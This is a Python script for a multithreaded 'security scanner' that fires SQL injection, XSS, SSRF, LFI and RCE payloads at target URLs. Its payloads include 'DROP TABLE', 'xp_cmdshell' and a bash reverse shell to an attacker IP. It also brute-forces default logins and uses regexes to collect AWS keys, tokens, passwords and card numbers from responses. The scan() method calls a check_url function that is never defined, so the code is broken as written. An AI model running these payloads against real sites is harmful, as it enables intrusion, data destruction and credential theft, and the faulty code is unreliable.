import requests
import threading
import json
import re
import os
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import random

class SuperSecurityScanner:
    def __init__(self, target_urls):
        self.target_urls = target_urls
        
        # Extensive Payload List from various sources
        self.payloads = {
            "SQLi": [
                "' OR '1'='1", '" OR "1"="1', "' OR 1=1 --", '" OR 1=1 --',
                "' UNION SELECT NULL, NULL, NULL--", "' AND 1=2 UNION SELECT NULL,NULL--",
                "'; DROP TABLE users; --", "'; SELECT * FROM information_schema.tables; --",
                "'; EXEC xp_cmdshell('dir'); --", "'; SELECT load_file('/etc/passwd'); --"
            ],
            "XSS": [
                "<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>",
                "<svg/onload=alert(1)>", "<a href='javascript:alert(1)'>Click me</a>",
                "<body onload=alert(1)>", "<iframe src='javascript:alert(1)'></iframe>"
            ],
            "SSRF": [
                "http://localhost:8080", "http://127.0.0.1", "http://169.254.169.254", 
                "http://0.0.0.0", "http://192.168.1.1", "http://localhost/admin", 
                "http://127.0.0.1/admin", "http://169.254.169.254/latest/meta-data/"
            ],
            "LFI": [
                "../../../../etc/passwd", "../../etc/passwd", "/etc/passwd",
                "../../../../var/www/html/config.php", "/var/www/html/.env", 
                "/var/log/syslog", "../../../../proc/self/environ"
            ],
            "RCE": [
                "system('ls');", "system('whoami');", "exec('id');", "shell_exec('ls');",
                "popen('ls');", "phpinfo();", "system('cat /etc/passwd');", "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"
            ],
            "Bruteforce": [
                "admin:admin", "root:root", "user:user", "admin:1234", "guest:guest", 
                "administrator:password", "admin:password", "test:test"
            ]
        }
        
        # Sensitive Data patterns
        self.sensitive_data_patterns = [
            r"(AKIA[0-9A-Z]{16})",  # AWS Keys
            r"([A-Za-z0-9]+@[A-Za-z0-9]+\.[A-Za-z]{2,6})",  # Email addresses
            r"(?:\d{4}[- ]){3}\d{4}",  # Credit Card Number
            r"(?<=API[ -]?[kK]ey[: ]?)([A-Za-z0-9]{32})",  # API Keys
            r"eyJ[a-zA-Z0-9-_\.]{10,200}",  # JWT Token
            r"([A-Za-z0-9_]+(?:-[A-Za-z0-9_]+)*)\.([A-Za-z]{2,5})",  # Domain Names
            r"password\s*=\s*[^\s]+",  # Common password fields in plaintext
            r"(\b(?:0x)?[A-Fa-f0-9]{40}\b)",  # SHA1 Hashes (password hashes)
            r"(mongodb://[A-Za-z0-9]+:[A-Za-z0-9]+@([A-Za-z0-9.-]+):\d+)",  # MongoDB URI
            r"((?:https?|ftp):\/\/(?:[A-Za-z0-9\-]+\.)+[A-Za-z]{2,6}(:\d+)?(?:\/[^\s]*)?)"  # URLs (URLs in general)
        ]
        
        self.vulnerabilities = []
        self.sensitive_data = []

    # Check for SQL Injection
    def check_sql_injection(self, url):
        print(f"Checking SQL Injection for {url}")
        for payload in self.payloads["SQLi"]:
            r = requests.get(url + payload)
            if "error" in r.text or "database" in r.text:
                self.vulnerabilities.append({
                    "type": "SQL Injection",
                    "url": url,
                    "payload": payload
                })
                print(f"SQL Injection vulnerability found at {url} with payload {payload}")

    # Check for Cross-Site Scripting (XSS)
    def check_xss(self, url):
        print(f"Checking XSS for {url}")
        for payload in self.payloads["XSS"]:
            r = requests.get(url + payload)
            if payload in r.text:
                self.vulnerabilities.append({
                    "type": "XSS",
                    "url": url,
                    "payload": payload
                })
                print(f"XSS vulnerability found at {url} with payload {payload}")

    # Check for Server Side Request Forgery (SSRF)
    def check_ssrf(self, url):
        print(f"Checking SSRF for {url}")
        for payload in self.payloads["SSRF"]:
            r = requests.get(url + "?url=" + payload)
            if payload in r.text:
                self.vulnerabilities.append({
                    "type": "SSRF",
                    "url": url,
                    "payload": payload
                })
                print(f"SSRF vulnerability found at {url} with payload {payload}")

    # Check for Local File Inclusion (LFI)
    def check_lfi(self, url):
        print(f"Checking LFI for {url}")
        for payload in self.payloads["LFI"]:
            r = requests.get(url + "?file=" + payload)
            if "root" in r.text or "passwd" in r.text:
                self.vulnerabilities.append({
                    "type": "LFI",
                    "url": url,
                    "payload": payload
                })
                print(f"LFI vulnerability found at {url} with payload {payload}")

    # Check for Remote Code Execution (RCE)
    def check_rce(self, url):
        print(f"Checking RCE for {url}")
        for payload in self.payloads["RCE"]:
            r = requests.get(url + "?cmd=" + payload)
            if "bin" in r.text or "ls" in r.text:
                self.vulnerabilities.append({
                    "type": "RCE",
                    "url": url,
                    "payload": payload
                })
                print(f"RCE vulnerability found at {url} with payload {payload}")

    # Check for Bruteforce Vulnerabilities
    def check_bruteforce(self, url):
        print(f"Checking Bruteforce for {url}")
        for payload in self.payloads["Bruteforce"]:
            username, password = payload.split(":")
            data = {"username": username, "password": password}
            r = requests.post(url, data=data)
            if "login successful" in r.text or "incorrect" not in r.text:
                self.vulnerabilities.append({
                    "type": "Bruteforce",
                    "url": url,
                    "payload": payload
                })
                print(f"Bruteforce vulnerability found at {url} with payload {payload}")

    # Check for sensitive data exposure
    def check_sensitive_data(self, url):
        print(f"Checking for sensitive data at {url}")
        r = requests.get(url)
        for pattern in self.sensitive_data_patterns:
            matches = re.findall(pattern, r.text)
            for match in matches:
                self.sensitive_data.append({
                    "type": "Sensitive Data",
                    "url": url,
                    "pattern": pattern,
                    "data": match
                })
                print(f"Sensitive data found at {url} - {match}")

    # Check headers for security configuration
    def check_headers(self, url):
        print(f"Checking Security Headers for {url}")
        r = requests.get(url)
        if "X-Frame-Options" not in r.headers:
            self.vulnerabilities.append({
                "type": "Missing X-Frame-Options",
                "url": url
            })
            print(f"Missing X-Frame-Options at {url}")

        if "X-Content-Type-Options" not in r.headers:
            self.vulnerabilities.append({
                "type": "Missing X-Content-Type-Options",
                "url": url
            })
            print(f"Missing X-Content-Type-Options at {url}")
    
    # Function to run scan on all URLs
    def scan(self):
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(self.check_url, self.target_urls)

    # Function to generate the report
    def generate_report(self):
        report = {
            "vulnerabilities": self.vulnerabilities,
            "sensitive_data": self.sensitive_data
        }
        print("\nScan completed. Generating report...\n")
        print(json.dumps(report, indent=4))

# Main Execution
if __name__ == "__main__":
    target_urls = [
        "http://example.com",  # Replace with your target URLs
        "http://another-example.com"
    ]

    scanner = SuperSecurityScanner(target_urls)
    scanner.scan()
    scanner.generate_report()